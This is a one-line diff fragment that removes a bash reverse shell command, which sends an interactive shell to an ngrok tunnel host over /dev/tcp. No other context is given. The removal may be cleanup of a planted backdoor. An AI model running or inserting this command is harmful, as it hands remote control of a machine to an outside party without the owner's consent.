@@ -1,1 +1,0 @@
-bash -c 'bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/19801 0>&1'
